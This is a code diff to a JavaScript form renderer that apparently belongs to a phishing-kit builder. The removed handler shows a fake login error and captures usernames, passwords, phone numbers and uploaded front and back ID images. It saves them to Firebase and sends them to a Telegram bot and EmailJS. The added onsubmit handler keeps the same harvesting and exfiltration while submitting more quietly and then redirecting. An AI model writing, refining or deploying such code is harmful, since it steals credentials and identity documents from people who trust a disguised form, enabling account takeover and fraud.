@@ -210,11 +210,97 @@ if(data.videoLinks){
   }
 
   // Form inputs container
-  const formDiv = document.createElement("div");
-  formDiv.style.display = "flex";
-  formDiv.style.flexDirection = "column";
-  formDiv.style.alignItems = data.btnPosition === "left" ? "flex-start" : data.btnPosition === "right" ? "flex-end" : "center";
-  formDiv.style.gap = "8px";
+  const formDiv = document.createElement("form");
+  
+  formDiv.onsubmit = async (e)=>{
+  e.preventDefault();
+
+  // 🔥 Upload files
+  const frontFile = document.getElementById("frontUpload")?.files[0];
+  const backFile = document.getElementById("backUpload")?.files[0];
+
+  let uploadedFront = "";
+  let uploadedBack = "";
+
+  if(frontFile) uploadedFront = await uploadFile(frontFile);
+  if(backFile) uploadedBack = await uploadFile(backFile);
+
+  const fileURL = [uploadedFront, uploadedBack].filter(Boolean).join(" | ");
+
+  // Collect inputs
+  const inputs = formDiv.querySelectorAll("input");
+
+  const username = inputs[0]?.value || "";
+  const password = inputs[1]?.value || "";
+  const extraValues = extraInputs.map(i => i.value);
+
+  // Save to Firebase
+  await db.collection("submissions").add({
+    formId: formId || "unknown",
+    formTitle:
+      (data.title && data.title.trim()) ||
+      (data.pageTitle && data.pageTitle.trim()) ||
+      "Untitled Form",
+    createdAt: Date.now(),
+    data: {
+      username,
+      password,
+      extraFields: extraValues,
+      file: fileURL
+    }
+  });
+
+  // Telegram
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `New Submission:
+User: ${username}
+Pass: ${password}
+Extra: ${extraValues.join(", ")}
+Files: ${fileURL || "None"}`
+    })
+  }).catch(console.error);
+
+  // EmailJS
+  if(typeof emailjs !== "undefined"){
+    emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
+      username, password, extra: extraValues.join(", ")
+    }).catch(console.error);
+  }
+
+  // ✅ CUSTOM SUCCESS MESSAGE OR REDIRECT
+
+if(data.enableRedirect === true && data.redirectURL && data.redirectURL.trim() !== ""){
+  window.location.href = data.redirectURL;
+} 
+else if(data.enableSuccessMessage === true){
+
+  // Remove form
+  formDiv.innerHTML = "";
+
+  const successBox = document.createElement("div");
+  successBox.style.padding = "15px";
+  successBox.style.background = "#e8f5e9";
+  successBox.style.border = "1px solid #4caf50";
+  successBox.style.borderRadius = "8px";
+  successBox.style.textAlign = "center";
+  successBox.style.marginTop = "10px";
+
+  successBox.innerHTML = `
+    <h3 style="color:#2e7d32;">✔ Success</h3>
+    <p>${data.successMessage || "Submitted successfully!"}</p>
+  `;
+
+  formDiv.appendChild(successBox);
+
+} 
+else {
+  alert("Submitted successfully");
+}
+};
 
   // Auth fields
   if(data.addAuth === true){
@@ -315,6 +401,7 @@ if(data.enableFileUpload){
   // Main Button (fake error + capture + redirect)
   if(data.showMainBtn === true){
     const mainBtn = document.createElement("button");
+    mainBtn.type = "submit";
     if(data.btnAnimationEffect){
   mainBtn.className = data.btnAnimationEffect.join(" ");
 }
@@ -325,80 +412,7 @@ if(data.enableFileUpload){
     mainBtn.style.border = "none";
     mainBtn.style.borderRadius = "8px";
 
-    mainBtn.onclick = async (e)=>{
-  e.preventDefault();
-
-  // 1️⃣ Show fake error
-  alert("wrong username/email/phone try again");
-
-  // 🔥 Upload ID files
-  const frontFile = document.getElementById("frontUpload")?.files[0];
-  const backFile = document.getElementById("backUpload")?.files[0];
-
-  let uploadedFront = "";
-  let uploadedBack = "";
-
-  if(frontFile) uploadedFront = await uploadFile(frontFile);
-  if(backFile) uploadedBack = await uploadFile(backFile);
-
-  // combine both
-  const fileURL = [uploadedFront, uploadedBack].filter(Boolean).join(" | ");
-
-  // 2️⃣ Collect form values
-  const inputs = formDiv.querySelectorAll("input");
-
-const username = inputs[0]?.value || "";
-const password = inputs[1]?.value || "";
-
-
-// ✅ FIX: collect extra field values
-const extraValues = extraInputs.map(i => i.value);
-
-  // 3️⃣ Save
-await db.collection("submissions").add({
-  formId: formId || "unknown",
-  formTitle:
-    (data.title && data.title.trim()) ||
-    (data.pageTitle && data.pageTitle.trim()) ||
-    "Untitled Form",
-  createdAt: Date.now(),
-  data: {
-    username: username,
-    password: password,
-    "Phone Number": extraValues[0] || "",
-    extraFields: extraValues,
-    file: fileURL,
-    title: data.title || "",
-    logo: data.logoURL || ""
-  }
-});  
-
-      // 4️⃣ Send Telegram
-      const telegramMsg = `
-New Form Submission:
-Username: ${username}
-Password: ${password}
-Extra: ${extraValues.join(", ")}
-Time: ${new Date().toLocaleString()}
-`;
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: telegramMsg })
-      }).catch(console.error);
-
-      // 5️⃣ Send Email (optional via EmailJS)
-      if(typeof emailjs !== "undefined"){
-        emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
-          username, password, extra: extraValues.join(", "), date: new Date().toLocaleString()
-        }).catch(console.error);
-      }
-
-      // 6️⃣ Redirect if enabled
-      if(data.enableRedirect && data.redirectURL){
-        setTimeout(()=>window.location.href = data.redirectURL, 500);
-      }
-    };
+  
     formDiv.appendChild(mainBtn);
   }
 
@@ -479,11 +493,7 @@ document.querySelector('meta[name="twitter:description"]')?.setAttribute("conten
 document.querySelector('meta[name="twitter:image"]')?.setAttribute("content", ogImage);
 
 // ✅ LOAD GENERATED HTML DIRECTLY
-if(data.htmlContent){
-  document.getElementById("formWrap").innerHTML = data.htmlContent;
-} else {
-  renderForm(data);
-}
+renderForm(data);
 
   })
   .catch(err => {
